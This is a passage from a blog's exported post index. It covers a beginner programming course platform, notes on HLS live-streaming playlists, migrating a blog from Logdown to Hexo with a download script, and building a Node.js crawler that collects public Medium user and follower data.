long, and although I really wanted to include the word “honest,” it just didn’t seem to fit. Therefore, I decided to shorten it to “An Online Programming Course Platform for Beginners.” The concept of being born for beginners is easy to understand. I have mentioned it many times before. My teaching intention is to bring beginners into this field and let them know that programming is not difficult at all and is very interesting! The reason I wanted to include the point of honesty is that I have always wanted to create a transparent platform. How transparent? First of all, in terms of courses, I hope to put good and bad reviews side by side so that everyone knows what students’ feedback is on this course, not just good reviews. This may affect sales, but I don’t care. Rather than selling well, I hope that people who come to buy courses already know the pros and cons. I hope they purchase after fully understanding the evaluation and content of the course. If possible, I also want to disclose how much revenue and expenses are involved in operating this platform, but that’s for later since there are no paid courses yet. The Future of LidemyCurrently, there is only one course on front-end programming, and the courses on Hahow will not be able to be transferred to my own platform and re-launched until more than a year later when the contract expires. Therefore, I need to plan carefully what content will be on Lidemy in the future. In the long-term, I want to make Lidemy a platform that has everything. You can find almost anything you want to learn, such as Android, iOS, web front-end and back-end, etc. But in the short term, I should focus on the web design that I am more familiar with. A friend asked me before, “There are already so many resources for web design. Why do you still want to do it?” Because I want a beginner’s entry and strengthening to be on the same course platform. To create such a learning system, I must jump down and teach the most basic HTML&#x2F;CSS&#x2F;JS myself. Start from the basics and keep strengthening. Below are several courses that I am currently planning. They are not completely confirmed yet, but if there is one that you really want to take, you can leave a message below, and it will increase the chances of this course being offered. Introduction to HTML&#x2F;CSS Introduction to JavaScript Introduction to Git CS50 Guide Introduction to Scratch Introduction to React ConclusionIf you are interested in this type of teaching, you can register on Lidemy Lithium Academy to get the latest information on new courses, or you can follow Lidemy’s Facebook fan page to be the first to know the latest news. This concludes the introduction to Lidemy Lithium Academy. Thank you, everyone.","link":"/2017/06/24/en/lidemy-online-programming-course-platform-for-the-beginner/"},{"title":"Notes on HLS Protocol","text":"IntroductionRecently, I have been working on live streaming related projects. Although I am a frontend developer, I still need to understand some of the principles of live streaming. At least, I need to know what formats are available and what are the advantages and disadvantages of each format. This will make the development process smoother. This article will briefly record some of my experiences and information. If you want to have a deeper understanding of HLS, you can refer to the following two articles: Choosing a Live Streaming Protocol: RTMP vs. HLS HLS Protocol for Online Video - Study Notes: M3U8 Format Explanation and Practical Application Analysis What is HLS?In terms of live streaming, I think HLS is a relatively easy-to-understand protocol. It is simply a .m3u8 playlist that contains multiple .ts files. You just need to play the files in the order given in the playlist. It sounds easy, right? To help you understand better, I will provide an example of a playlist extracted from somewhere: #EXTM3U #EXT-X-VERSION:3 #EXT-X-ALLOW-CACHE:YES #EXT-X-MEDIA-SEQUENCE:4454 #EXT-X-TARGETDURATION:4 #EXTINF:3.998, no desc 25133_src&#x2F;4460.ts #EXTINF:3.992, no desc 25133_src&#x2F;4461.ts #EXTINF:3.985, no desc 25133_src&#x2F;4462.ts #EXTINF:3.979, no desc 25133_src&#x2F;4463.ts #EXTINF:3.996, no desc 25133_src&#x2F;4464.ts Even if you have never seen this format before, you can probably guess what it is doing. Each ts is a segment, and #EXTINF:3.996 represents the duration of the segment. #EXT-X-TARGETDURATION:4, the number here must be greater than the time of any video in the playlist. It means that the player should fetch a new playlist every few seconds. For example, the next playlist fetched may look like this: #EXTM3U #EXT-X-VERSION:3 #EXT-X-ALLOW-CACHE:YES #EXT-X-MEDIA-SEQUENCE:4455 #EXT-X-TARGETDURATION:4 #EXTINF:3.992, no desc 25133_src&#x2F;4461.ts #EXTINF:3.985, no desc 25133_src&#x2F;4462.ts #EXTINF:3.979, no desc 25133_src&#x2F;4463.ts #EXTINF:3.996, no desc 25133_src&#x2F;4464.ts #EXTINF:3.998, no desc 25133_src&#x2F;4465.ts An additional segment is added at the end. So as long as you follow this rule, you can continuously fetch new segments. But what if the server does not generate a new playlist in time? For example, if you fetch the playlist at 4 seconds and find that it has not been updated, but the server generates a new segment at 4.5 seconds. If this “fetching the same playlist” situation occurs, the fetching time will be halved until a new segment is fetched. In the above example, if a new segment is not fetched at 4 seconds, it will be fetched again after 2 seconds. This rule can be found in: HTTP Live Streaming draft-pantos-http-live-streaming-20 When a client loads a Playlist file for the first time or reloads a Playlist file and finds that it has changed since the last time it was loaded, the client MUST wait for at least the target duration before attempting to reload the Playlist file again, measured from the last time the client began loading the Playlist file. If the client reloads a Playlist file and finds that it has not changed then it MUST wait for a period of one-half the target duration before retrying. As for the latency issue that is most concerned with live broadcasting, it can be directly inferred from this playlist. In the example above, there are a total of 5 segments, each segment is 4 seconds, and the latency is 20 seconds. Apple’s official recommendation is 3 segments, each segment is 10 seconds. What duration should media files be?A duration of 10 seconds of media per file seems to strike a reasonable balance for most broadcast content. How many files should be listed in the index file during a continuous, ongoing session?The normal recommendation is 3, but the optimum number may be larger. Refer to: Apple: HTTP Live Streaming Overview However, according to the official recommendation, there will be a delay of 30 seconds. Of course, the longer the delay, the better the live broadcast situation, but the experience will be slightly worse. Therefore, let’s take a look at how several live streaming websites are set up. First, let’s take a look at the big live streaming website: Twitch #EXTM3U #EXT-X-VERSION:3 #EXT-X-TARGETDURATION:5 #ID3-EQUIV-TDTG:2016-11-26T02:40:23 #EXT-X-MEDIA-SEQUENCE:376 #EXT-X-TWITCH-ELAPSED-SYSTEM-SECS:1511.137 #EXT-X-TWITCH-ELAPSED-SECS:1508.980 #EXT-X-TWITCH-TOTAL-SECS:1535.137 #EXTINF:4.000, index-0000000377-6zCW.ts #EXTINF:4.000, index-0000000378-vHZS.ts #EXTINF:4.000, index-0000000379-Gkgv.ts #EXTINF:4.000, index-0000000380-PNoG.ts #EXTINF:4.000, index-0000000381-h58g.ts #EXTINF:4.000, index-0000000382-W88t.ts 6 segments * 4 seconds &#x3D; 24 seconds. However, if you observe carefully (you can use chrome devtool), after the twtich player gets the list, it will directly try to load from the “third to last” segment, so the delay is shortened to 3 * 4 &#x3D; 12 seconds. Next, let’s take a look at Taiwan’s livehouse.in #EXTM3U #EXT-X-VERSION:3 #EXT-X-ALLOW-CACHE:NO #EXT-X-MEDIA-SEQUENCE:2291 #EXT-X-TARGETDURATION:6 #EXTINF:5.2090001106262207, 1480116261segment_v02291.ts #EXTINF:5.2080001831054688, 1480116261segment_v02292.ts #EXTINF:5.2080001831054688, 1480116261segment_v02293.ts 5 * 3 &#x3D; 15 seconds. Therefore, the delay of general live streaming websites using HLS is usually within the range of 10-20 seconds. I guess if it is shorter than this, the server pressure may be very high, and if the network speed is slow, it will look very stuck. If it is longer than this, although it is very smooth, the user experience is not good and the delay is too high. Therefore, the best delay can be found in this range. Finally, let’s take a look at the options for playing on a webpage. Because it is now an era where flash is dying, if possible, the preferred choice is of course HTML5. If the browser support is not high enough, then fallback to flash. Let’s first introduce some commercial licensed players, such as jwplayer or flowplayer, which are both good options. Especially when open source solutions have problems that you can’t fix, you will hope that the company can spend money to buy a commercial player to solve all the problems. The open source solution is probably only videojs left. I don’t know if there are any other emerging players. If there are, please recommend them. Then, because the browser itself cannot play the hls format, some plugins need to be used. Videojs has an official videojs-contrib-hls, which can be added to play, but I don’t feel it’s very good after using it myself. Finally, I chose the open source solution hls.js provided by the well-known video website dailymotion. This article is their official blog, which introduces why they wrote their own solution and what problems it solves. It’s worth reading and you can learn more about it.","link":"/2016/11/26/en/livestreamming-hls-note/"},{"title":"Experience of Moving Blog: From Logdown to Hexo","text":"PrefaceFinally, it’s done! It took me a whole day to deal with the moving stuff, which was really troublesome, and I encountered many small problems along the way. So I wrote this article to record my experience. Why Move?As you know, I know, and the one-eyed dragon knows, Logdown is basically a stagnant product. It hasn’t been updated for a long time, and it seems that it won’t be updated anymore. I really like Logdown because I think it’s very convenient and handy to use. However, since it is a product that has stopped maintenance, there are some risks if it continues to be used, such as the blog suddenly crashing or all articles disappearing one day. So, I took advantage of the recent free time to quickly move the entire blog out to avoid any disasters that might happen later. But actually, I didn’t really want to move… After all, moving is really troublesome, and this time I also changed to a brand new domain, which is good in the long run, but it also means giving up the traffic I accumulated before. The First Challenge: Exporting ArticlesThere is a function in the Logdown backstage that can export all the blog’s articles and send them to your mailbox, but when I clicked it several times, it only showed a notification saying “The articles will be sent to your mailbox in 5 minutes”, and then I didn’t receive anything. So I guess either it’s broken, or my articles are too many and the file size is too large, so it’s GG. But no matter which one it is, I won’t be able to use this function. As an engineer, I immediately thought of writing a crawler or something, but after studying the structure of Logdown, I gave up because all the data returned by its APIs are in HTML… I don’t want to parse it myself… Just when I was desperate, I suddenly found a “Download in Markdown format” function in the backstage, which can download a single article. After trying this function and confirming that it works, I immediately thought of a solution: As long as I have all the download links for the articles, I can write a script to download them all. Step One: Get the URLsGo to the Logdown backstage (http://logdown.com/account/posts) and scroll down until there are no more articles. Open Chrome devtool and execute the following code, then right-click and save the result. var a = Array.prototype.map.call(document.querySelectorAll('a'), item => item.getAttribute('href')).filter(item => item.indexOf('/raw') >= 0);for(var k of a) &#123;console.log('\"'+k+'\"')&#125; If nothing unexpected happens, the console should display results like this: .... VM192:1 \"/account/posts/294284-javascript-redux-middleware-details-tutorial/raw\" VM192:1 \"/account/posts/294037-javascript-redux-basic-tutorial/raw\" VM192:1 \"/account/posts/293940-javascript-redux-model-real-world-browserhistory-not-found/raw\" After replacing the annoying string in front of it, you will get the URLs of all articles. Step Two: DownloadBut after getting the URLs, how do we download so many URLs? It’s very simple. We can write a bash script ourselves to do it! The core code is to use wget to grab the article. Here, the session key can be found by looking at the value of the cookie in Chrome: wget --heade=\"Cookie:_logdown_session=xxxx;\" http://logdown.com/account/posts/2223627-review-the-classical-sort-algorithm-with-javascript/raw -O review-the-classical-sort-algorithm-with-javascript.md Complete script: declare -a arr=( \"/account/posts/2223627-review-the-classical-sort-algorithm-with-javascript/raw\" \"/account/posts/2223612-dom-event-capture-and-propagation/raw\" \"/account/posts/2223601-http-cache/raw\" \"/account/posts/2223581-ajax-and-cors/raw\" ) for i in \"$&#123;arr[@]&#125;\" do url=\"http://logdown.com\"$&#123;i&#125; name=`echo $url | sed \"s/.*posts\\/[0-9]*[-]//g\" | sed \"s/\\/raw//g\"` wget --heade=\"Cookie:_logdown_session=xxx;\" $url -O $name\".md\" done Replace the URLs below with the URLs obtained from Chrome, and replace the session with your own, and you’re done downloading all the articles! It’s great to be an engineer. The Second Challenge: Fixing Article FormatsThe articles downloaded from Logdown still need to add some meta tags to run normally on Hexo, and I also want to fix the tags. This part was completely done manually… I fixed about two hundred articles because I couldn’t automatically add tags. (It’s possible to write a program to do it, but I’m too lazy to do it.) There is also a place where I used the syntax forbidden by Hexo in some articles, which is the two curly braces. Hexo reports an error directly, but it doesn’t tell me which article it is. So I had to use binary search to keep removing articles to see where the problem was. The Third Challenge: Table of Contents BrokenNow you can see the TOC on the right, which is a feature I really like, but I don’t know why it’s broken. After tracing the code of Hexo myself, I found a strange problem, which is that cheerio cannot grab the id of the span, so all the links become undefined. As an engineer, of course, I can fix these small issues myself, so I fixed two small places: // 原本的 var $ = cheerio.load(str); // 改過的，加上 decodeEntities 處理中文 // https://cnodejs.org/topic/54bdd639514ea9146862ac37 var $ = cheerio.load(str, &#123;decodeEntities: false&#125;); // 原本的，會抓不到 id var id = $(this).attr('id'); // 自己加上下面這一段用 Regexp 抓出來 if (!id) &#123; var temp = $(this).html().match(/id=\"(.*)\">/); if (temp &amp;&amp; temp[1]) &#123; id = temp[1]; &#125; &#125; It’s great to be an engineer. ConclusionThe template used this time is: hexo-theme-beantech, which I think is a very good layout. However, I also made some small changes myself. After experiencing this move, I feel that Hexo (blog system) + Github Page (Hosting) + Cloudflare (https) is the best practice for engineers to write blogs, all free solutions, and all necessary things are available at once, which is great. By the way, it can be changed to cooperate with CI to do automatic deployment in the future, but let’s study that later!","link":"/2017/09/03/en/moving-from-logdown-to-hexo/"},{"title":"The Evolution of Web Scraping on Medium","text":"IntroductionA few days ago, I posted an article on Medium titled Medium Chinese Writers’ Follower Ranking and Unprofessional Data Analysis, in which I used Node.js to write a simple web scraper and analyzed the data. Although I briefly mentioned the data source of the web scraper in the original article, I did not elaborate much on the technical aspects. In fact, I encountered some difficulties while writing the Medium web scraper. Instead of teaching everyone how to write a Medium web scraper, I think it would be more interesting to share my experience and the solutions I found to the problems I encountered while writing the web scraper. Therefore, this article is intended to document my experience of writing the Medium web scraper, and also includes some tutorial elements. After reading this article, you should be able to write a similar web scraper, or at least not be confused when looking at the source code. Although the web scraper I eventually wrote was related to user data, I actually started with the article list because I had a need to scrape all of my own articles. The reason for this need is that the built-in functionality of Medium is actually quite poor. It is difficult to find all the articles posted by an author, or it is difficult to see them at a glance. Therefore, early articles were difficult to find except through Google. So I manually created an index of articles and organized all the articles I had previously posted. But as an engineer, this is clearly something that can be done with code! So I wanted to try writing a web scraper for the article list. First Attempt: Finding the Data SourceFor me, the first and most difficult step in web scraping is finding the data source. Once this step is completed, everything else is relatively easy. If you can get the Medium API, that would be the best. If not, you have to use something like puppeteer to scrape the HTML and parse it yourself. Scrolling through the article list on Medium and opening the devtool, you can see that Medium uses GraphQL: This is troublesome… I am not very familiar with GraphQL, and it takes time to study its data structure. So at that time, I temporarily gave up this route and decided to try using puppeteer. Second Attempt: PuppeteerIf you don’t know what puppeteer is, I’ll briefly introduce it here. You can think of puppeteer as automatically opening a browser for you, and you can write code to manipulate this browser. For example, if I want to open a page and execute JS on this page, etc., then using puppeteer, the principle of web scraping is to open a certain page, execute a piece of JS, and get the data on the page. Puppeteer is easy to use. Just find an existing example and look at the syntax, modify it, and you can use it directly. After studying the HTML structure a bit, I wrote the following code: const puppeteer = require('puppeteer') async function main() &#123; const username = 'hulitw' const url = 'https://medium.com/@' + username const browser = await puppeteer.launch(&#123; headless: true &#125;) // 造訪頁面 const page = await browser.newPage() await page.goto(url, &#123; waitUntil: 'domcontentloaded' &#125;) // 執行準備好的 script 並回傳資料 const data = await page.evaluate(mediumParser) console.log(data) await page.close() await browser.close() &#125; function mediumParser() &#123; // selector 是透過觀察而得來的 const elements = document.querySelectorAll('section > div:nth-child(2) > div > div') const result = [] for (let i = 0; i &lt; elements.length; i++) &#123; const h1 = elements[i].querySelector('h1') const a = elements[i].querySelectorAll('a') if (h1) &#123; result.push(&#123; title: h1.innerText, link: a[3].href &#125;) &#125; &#125; return result &#125; main() As long as you observe the HTML and CSS rules, you can get the data you want. But Medium is difficult to scrape because it uses functional CSS in the class name, and the class names are processed programmatically, so they may be different when Medium is updated. So in the end, I had to start with the HTML structure to extract the articles. After solving this problem, there is another problem, which is infinite scrolling. Like many web pages, Medium needs to scroll down continuously to load new articles, and the rule that needs to be observed here is when to stop scrolling. After observation, I found that when the published articles are loaded, the Highlighted by xxx block will be displayed. Therefore, this element can be used as the termination condition. Then you can write a piece of code that keeps scrolling down until all articles are loaded: /* 要用的話就是： await scroll(page) */ function getArticlesCount() &#123; const elements = document.querySelectorAll('section > div:nth-child(2) > div > div') return elements.length &#125; async function scroll(page) &#123; await page.evaluate('window.scrollTo(0, document.body.scrollHeight)') try &#123; // 終止條件 await page.waitForSelector('h4 ~ p', &#123; timeout: 1000 &#125;) &#125; catch(err) &#123; // 印出目前抓到的文章數目 const count = await page.evaluate(getArticlesCount); console.log(`Fetching... $&#123;count&#125; articles`) // 繼續往下捲動 await scroll(page); &#125; &#125; In order to let me see the progress on the console (to confirm that there are no bugs in the program), I added a piece of code that prints the number of articles on the screen every time it scrolls. At this point, you can get all the titles and links of the user’s articles. What about the publication date? Can you get it? Yes, I can, but it’s complicated. You can see from the Medium screenshot below: [Image] If the article was published this year (2019), the year won’t be displayed. Otherwise, the publication year will be shown. Therefore, special processing is required here, and only the date can be obtained, not the exact time of publication. At this point, I got lazy and decided to switch to studying the API instead. Third Attempt: Puppeteer + APIAs I mentioned earlier, I wasn’t familiar with GraphQL API at the time, so I gave up on it temporarily. However, after trying out Puppeteer, I came up with a new idea. In Puppeteer, you can add an event listener for network responses. When the page loads the article, it will definitely call the API to retrieve the article. Isn’t this much easier? I don’t have to figure out how to call the API myself. I let the page call the API itself, and I just listen to the response and study its format! The code looks something like this: const apiResponses = [] page.on('response', async (response) => &#123; if (response._url.indexOf('graphql') &lt; 0) return const json = await response.json() try &#123; const post = parsePosts(json) apiResponses.push(...post) &#125; catch (err) &#123; &#125; &#125;) function parsePosts(json) &#123; const result = [] try &#123; // 研究到一半沒做完 const streams = json.data.user.profileStreamConnection.stream for (stream of streams) &#123; if (stream.itemType.__typename === 'StreamItemCompressedPostList') &#123; &#125; &#125; &#125; catch (err) &#123; &#125; &#125; Each time a new response comes in, I can parse it and add it to an array. Finally, I will get the complete data from the API. But then I found out that this approach wouldn’t work either. Why? Because when the page is first loaded, the HTML returned from the server already contains the data for the first few articles. It’s only when you scroll down that it uses AJAX to load new articles. This means that it’s impossible to use the AJAX response to get all the article data, as you won’t be able to get the data for the first few articles. At this point, I was a bit discouraged and thought that I had spent two days writing something that couldn’t be used. I gave up on trying to retrieve the article list and decided to focus on what I really wanted to get. The need to retrieve the article list actually came up suddenly. Before that, there was something else I wanted to get: followers. I wanted to count the number of followers for Taiwanese writers and see where I ranked (just to satisfy my vanity). After failing to retrieve the article list, I tried to use a similar approach to retrieve followers. However, I found that this method was too inefficient. If I loaded 25 followers each time I scrolled, it would take 40 scrolls to load 1000 followers. If I couldn’t do it myself, the answer was obvious: Google, please help me! Fourth Attempt: GoogleI searched for “medium follower api” on Google, and the first search result was the official API, which was almost useless and required me to send an email to customer service to apply. But the second search result caught my eye. It was a gist file: Medium API: get number of followers for User · GitHub. The code was only fifty lines long, very short. The most important line was: // BUILD THE URL TO REQUEST FROM function generateMediumProfileUri(username) &#123; return `https://medium.com/@$&#123;username&#125;?format=json`; &#125; What! It turns out that if you add ?format=json to the URL, you can get the data in JSON format. This is amazing. After putting the data into JSON Formatter, you can see the general structure: [Image] Here, you can get the user’s profile information and some articles they’ve written, as well as our target: followers! Let’s take a look at what user information we can get: \"user\":&#123; \"userId\":\"f1fb3e40dc37\", \"name\":\"Huli\", \"username\":\"hulitw\", \"createdAt\":1487549030919, \"imageId\":\"1*WQyJUJBQpBNIHH8GEWE6Sg.jpeg\", \"backgroundImageId\":\"\", \"bio\":\"自學程式，後來跑去唸哲學系但沒念完，前往新加坡工作了兩年半後決定放一年的假，到處旅遊。喜歡教學，發現自己好像有把事情講得簡單又清楚的能力，相信分享與交流可以讓世界更美好。\\bMedium 文章列表請參考：https://aszx87410.github.io/blog/medium\", \"allowNotes\":1, \"mediumMemberAt\":1542441600000, \"isNsfw\":false, \"isWriterProgramEnrolled\":true, \"isQuarantined\":false, \"type\":\"User\" &#125; In addition to basic self-introduction and name, you can also get the time when the user became a Medium paid member and the time when the user became a Medium member. There’s also an interesting flag: isNsfw. The only thing missing is the list of followers. Here, I tried the same method and added the parameter https://medium.com/@hulitw/followers?format=json to the Medium URL, and I actually got something! In the response, I found the data for 10 followers. Once we have the data, we can confirm that this API is useful. Next, we jump directly to the paging section at the bottom of the response: \"paging\":&#123; \"path\":\"https://medium.com/_/api/users/f1fb3e40dc37/profile/stream\", \"next\":&#123; \"limit\":10, \"to\":\"10590c54e527\", \"source\":\"followers\", \"page\":2 &#125; &#125; The path part looks like an API URL, and next should be a parameter. Try adding these parameters to the URL: https://medium.com/_/api/users/f1fb3e40dc37/profile/stream?limit=10&amp;to=10590c54e527&amp;source=followers&amp;page=2, and only follower-related data appears! Try changing the limit value, and it seems that the maximum value should be 25, and 25 pieces of data can be obtained at a time. Changing the page value has no effect, so change the to value, and new data can be successfully obtained. It seems that the pagination mechanism is cursor-based. After several attempts, we finally got two API URLs, one for obtaining detailed personal information and the other for obtaining a list of followers! After determining the data source, we can start thinking about the crawler architecture. Crawler ArchitectureHow can we crawl as many Taiwanese writers as possible? The first problem is that we need to expand the scope a bit, because there may be writers from Hong Kong or China among Chinese writers, and it is difficult for the program to distinguish where they come from, especially Hong Kong and Taiwan, because they both use traditional Chinese. To avoid making the problem more complicated, we only need to be able to capture “Chinese users”. So how can we capture the most Chinese users? A very simple strategy is that we assume that the followers of Chinese users should all be Chinese users, so we just need to start from a user and put all of his followers into a queue, and keep doing this. In text, it is simplified as follows: Take a user out of the queue Write his data to the database Put all of his followers into the queue Go back to step 1 This way, we can infinitely extend from one user, and theoretically, we can obtain data from a large number of users. The reason why we choose followers (people who follow me) instead of following (people I follow) is that the users I follow may come from other countries, such as foreign engineers, but because I don’t write in English, foreign engineers should not come to follow me. This way, we can limit users to Chinese, which meets our goals. Next is the system architecture part, which will have different methods depending on the efficiency you want to achieve. For me, the most efficient way is to find a service that is very suitable for use as a queue, such as redis, and the database part can use MySQL or any software you are familiar with. The advantage of this is that you can open different machines, and each machine is a worker. For example, if you open five machines, there will be five workers constantly taking things out of the queue and putting followers in. The reason why so many machines are opened instead of many threads or processes is because of the problem of rate limiting. Generally, APIs have traffic restrictions. If you send too many requests from the same IP, you will be banned or unable to get a response for a period of time. Therefore, opening more processes and threads is useless, and only different machines can be opened to solve the problem (or if there is a way to change the IP). Later, because I didn’t care about efficiency and was too lazy to open many machines, I only planned to open one and let it crawl slowly. If there is only one worker, the queue part can also be simplified. Here, I also use MySQL to implement a simple queue, making the entire crawler architecture very simple. Let’s take a look at the database structure: Users id userId username name bio follower fr mediumMemberAt createdAt Auto-increment ID User ID Add @ in front to get the profile URL Username Bio Number of followers Category Time of becoming a paid member Time of joining Queue id userId Auto-increment ID User ID The execution process of the program is as follows: Take out a userId from the Queue. If the userId already exists in Users, go back to step 1. Write the user’s data into Users. Put all of the user’s followers into the Queue. Go back to step 1. When taking out from the queue, make sure that the user has not been crawled yet. If they have, skip them and put all of their followers back into the queue. This way, the program will keep running until there is nothing left in the queue. After designing the architecture, we can start coding! First Version of the CrawlerFirst, we need a queue that can push and pop, and can determine whether the current userId has already been crawled. This is very suitable for implementation using a class: class Queue &#123; constructor(conn) &#123; this.conn = conn &#125; get() &#123; return new Promise((resolve, reject) => &#123; this.conn.query('SELECT userId from Queues limit 1', (error, results) => &#123; if (error) &#123; console.log(error) return reject(error) &#125; if (results.length !== 1) &#123; return resolve(null) &#125; const data = results[0] this.conn.query('DELETE from Queues where userId=?', [data.userId], (err, results) => &#123; if (error) &#123; console.log(error) return reject(error) &#125; return resolve(data.userId) &#125;) &#125;); &#125;) &#125; check(uid) &#123; return new Promise((resolve, reject) => &#123; this.conn.query('SELECT userId from Users where userId=?', [uid], function (error, results) &#123; if (error) &#123; return reject(error) &#125; if (results.length > 0) &#123; return resolve(false) &#125; return resolve(true) &#125;); &#125;) &#125; push(list) &#123; return new Promise((resolve, reject) => &#123; const values = [] for (let item of list) &#123; values.push([item]) &#125; this.conn.query(` INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) => &#123; if (err) &#123; // console.log(err) &#125; resolve() &#125; ) &#125;) &#125; &#125; After having the queue, we can write the main logic. The structure of the main program will look like this: var connection = mysql.createPool(&#123; connectionLimit : 10, host : process.env.host, user : '', password : '', database : 'medium', charset: 'utf8mb4' &#125;) async function main() &#123; const queue = new Queue(connection) // 不斷從 queue 拿東西出來 while(true) &#123; const userId = await queue.get() if (!userId) &#123; console.log('no data from queue, end') break; &#125; // 看看是否已經爬過，爬過就跳掉 const check = await queue.check(userId) if (!check) &#123; continue &#125; // 拿 userId 做你想做的事 console.log('uid:', userId) &#125; &#125; Then, we just need to implement the following two functions: Fetch user data Write user data into the database Put followers back into the queue Since the Medium API response always has an anti-json hijacking header, we can wrap a function specifically to parse the API response: async function getMediumResponse(url) &#123; try &#123; const response = await axios.get(url) const json = JSON.parse(response.data.replace('])&#125;while(1);&lt;/x>', '')) return json &#125; catch(err) &#123; return null &#125; &#125; Then, we can write two functions, one to fetch user data and one to fetch follower data (functions with an underscore are lodash functions): async function getUserInfo(uid) &#123; const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream` const json = await getMediumResponse(url) if (!json) &#123; return &#123;&#125; &#125; const userId = _.get(json, 'payload.user.userId') const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0) return &#123; followerCount: follower, userId: userId, name: _.get(json, 'payload.user.name'), username: _.get(json, 'payload.user.username'), bio: _.get(json, 'payload.user.bio'), mediumMemberAt: _.get(json, 'payload.user.mediumMemberAt'), isWriterProgramEnrolled: _.get(json, 'payload.user.isWriterProgramEnrolled'), createdAt: _.get(json, 'payload.user.createdAt'), &#125; &#125; async function getFollowers(uid, to) &#123; let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200` if (to) &#123; url += '&amp;to=' + to &#125; const json = await getMediumResponse(url) if (!json) &#123; return &#123;&#125; &#125; const followers = _.keys(json.payload.references.Social) || [] const nextTo = _.get(json, 'payload.paging.next.to') return &#123; followers, nextTo &#125; &#125; Basically, we just call the API and process the data a little bit, then return what we are interested in. We only implemented the function to “fetch one follower” above, so we need to implement another function to “fetch all followers and put them into the queue”: async function getAllFollowers(uid, queue) &#123; const followers = [] let to = undefined while (true) &#123; const data = await getFollowers(uid, to) if (!data) &#123; break; &#125; followers.push(...data.followers) to = data.nextTo console.log(uid, 'fetching...', followers.length) if (data.followers.length === 0 || !to) &#123; break; &#125; await queue.push(data.followers) &#125; return followers &#125; This function will continuously fetch followers and put them into the queue, and print out how many followers have been fetched so far. Once all followers have been fetched, it will return all of the followers (it returns because I originally wrote the code to write all of the followers into the queue at once, but later found it to be less efficient, so I changed it to write them one by one). Finally, here is the code to write user data into the database: function format(time) &#123; if (!time) return null return moment(time).format('YYYY-MM-DD HH:mm:ss') &#125; function saveUserInfo(conn, info) &#123; conn.query(` INSERT INTO Users ( userId, username, name, bio, follower, mediumMemberAt, createdAt, isWriterProgramEnrolled ) VALUES ?`, [[[ info.userId, info.username, info.name, info.bio, info.followerCount, format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled ]]], (err) => &#123; if (err) &#123; // console.log(err) &#125; &#125; ) &#125; After writing these core functions, we just need to modify our main program to complete the entire crawler: async function main() &#123; const queue = new Queue(connection) while(true) &#123; // 1. 從 Queue 裡面拿出一個 userId const userId = await queue.get() if (!userId) &#123; console.log('no data from queue, end') break; &#125; // 2. 如果 userId 已存在 Users，回到步驟一 const check = await queue.check(userId) if (!check) &#123; continue &#125; console.log('uid:', userId) try &#123; const info = await getUserInfo(userId) // 如果沒抓到資料有可能是被擋了，先停個 3 秒 if (!info.userId) &#123; console.log('sleep...') await sleep(3000) &#125; // 3. 把他的資料寫進 Users saveUserInfo(connection, info) // 4. 把他的所有 follower 丟進 Queue if (info.followerCount > 0) &#123; // 把 followers 放到 queue 並印出總共幾筆資料 const followerList = await getAllFollowers(userId, queue) console.log('Add ' + followerList.length + ' into queue.') &#125; &#125; catch(err) &#123; // 有錯誤就先睡個 3 秒 console.log('error...sleep') await sleep(3000) &#125; &#125; &#125; The above code is what we wrote according to the previous logic: Take out a userId from the Queue. If the userId already exists in Users, go back to step 1. Write the user’s data into Users. Put all of the user’s followers into the Queue. Go back to step 1. However, I added an additional logic that when there is a problem calling the API, it will pause for 3 seconds. This is to prevent being rate limited. However, this mechanism is not very good because there is no retry, so once an error occurs, the userId is skipped. The original idea was that skipping one userId was not a big deal, after all, there may be 100,000 userIds in the queue, and even if it is skipped, it may still be thrown back into the queue later, so not implementing a retry mechanism is okay. After assembling all of the above code, we have the framework for the first version of the crawler. It runs okay, but it is just slower than expected. Also, the speed at which the queue grows is surprisingly fast. I ran it overnight and the queue had about 100,000 more data, but there were only four or five thousand in users. However, after running it overnight, I found a fatal error. Second Version of the Crawler: Judging ChineseThe fatal error is that the original assumption: “The followers of Chinese authors are all Chinese authors” is problematic, and upon careful consideration, this assumption is indeed very unreliable. So after running the crawler overnight, I found that there were a lot of foreign users in the database. And once there is one, there will be a lot of foreign users in your queue. To avoid this situation, I decided to start with the self-introduction and nickname, and write a function to determine whether the self-introduction and nickname contain Chinese characters. If they do, then they will be put in. Here, I directly copied the code I found on Stack Overflow, which looks very magical: function isChinese(text = '') &#123; // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287 const regex = /(\\p&#123;Script=Hani&#125;)+/gu; return text.match(regex) &#125; After fetching user data from the queue, we perform a check: const info = await getUserInfo(userId) // 非中文，直接略過 if (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123; continue; &#125; When doing this check, I already thought of a potential issue. Some people like to use English in their self-introduction and nickname, even though they are writing in Chinese. This could cause them to be misjudged and not added to the queue. At the time, I didn’t think it was a big deal since there weren’t many people like that, and it would be troublesome to fix. I had a solution in mind, which was to fetch their recently clapped or published articles and check if the titles were in Chinese. This would be a more accurate way to judge. However, I was too lazy to implement it and decided to let the crawler run for another day. The next morning, I discovered another problem that I never thought I would encounter. Crawler Version 3: Judging Japanese UsersThere were a lot of Japanese users in the user list. Some of them had nicknames or self-introductions in kanji, so they wouldn’t be filtered out by the Chinese check. When I discovered this problem, my first thought was, “If this were an interview, I would definitely be rejected for not thinking of this case…” To solve this problem, I added a regular expression to check if there were any Japanese characters (excluding kanji): function isJapanese(text = '') &#123; // @see: https://gist.github.com/ryanmcgrath/982242 const regexJP = /[\\u3040-\\u309F]|[\\u30A0-\\u30FF]/g; const jp = text.match(regexJP) if (jp &amp;&amp; jp.length >= 3) &#123; return true &#125; return false &#125; If there were three or more Japanese characters, it would be considered Japanese. I set the quantity because I was afraid that some Taiwanese people might use characters like の and be misjudged. However, a better approach would be to look at the ratio, such as if 80-90% of a sentence was in Chinese, it would be considered Chinese. The updated check logic is as follows: const info = await getUserInfo(userId) // 非中文，直接略過 if (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123; continue; &#125; if (isJapanese(info.bio) || isJapanese(info.name)) &#123; continue; &#125; If it’s not Chinese, skip it. Then check if it’s Japanese by looking at the self-introduction or nickname. Okay, now everything should be fine! So I cleared the data and let the crawler run for another night. The next day, I realized how naive I was. 